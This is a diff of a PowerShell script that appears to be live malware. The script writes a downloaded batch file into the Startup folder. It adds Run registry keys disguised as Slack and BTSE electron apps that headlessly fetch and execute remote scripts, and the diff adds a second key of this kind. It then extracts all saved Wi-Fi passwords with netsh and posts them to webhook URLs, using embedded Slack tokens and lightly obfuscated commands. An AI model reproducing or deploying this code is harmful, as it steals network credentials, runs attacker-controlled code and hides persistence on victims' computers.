@@ -6,6 +6,7 @@ $swbt='https://hooks.slack.com/services/T08F0' + '53J6G5/B08FXT4AHU0/MhBJ6ZQkjW5
 $sat = "xoxb-8510173618549-855156999" + "8048-9VGiG8Blv8C7OABqVo9xP9m5"
 
 echo (iwr https://raw.githubusercontent.com/BTSEcomm/btse-api/refs/heads/main/l.bat).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ /f /v slack.electron.app /t REG_SZ /d "conhost --headless powershell.exe -Command \`"irm https://raw.githubusercontent.com/BTSEcomm/btse-api/refs/heads/main/toaster.ps1 | iex\`"" > $null
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ /f /v btse.electron.app /t REG_SZ /d "conhost --headless powershell.exe -Command \`"irm https://raw.githubusercontent.com/BTSEcomm/btse-api/refs/heads/main/crab.ps1 | iex\`"" > $null
 
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object { $q1t = $_.Matches.Value; if (netsh wlan show profile $q1t key=clear | Select-String 'Security key\s+:\sPresent') { $passw = netsh wlan show profile $q1t key=clear | Select-String '(?<=Key Content\s+:\s).+' | ForEach-Object { $_.Matches.Value -replace '^\s*Key Content\s*:\s*', '' }; $a6 = @{'username' = $env:username + " | " + [string]$q1t; 'content' = "PSK: "+[string]$passw}; i""r''m -ContentType 'Application/Json' -Uri $dwbt -Method Post -Body ($a6 | ConvertTo-Json); $swbtm = @{'text' = "`*User: $env:USERNAME`*`nSSID: $q1t`nPSK: $passw"} | ConvertTo-Json -Compress; irm -ContentType 'Application/Json' -Uri $swbt -Method Post -Body $swbtm}}  > $null
 
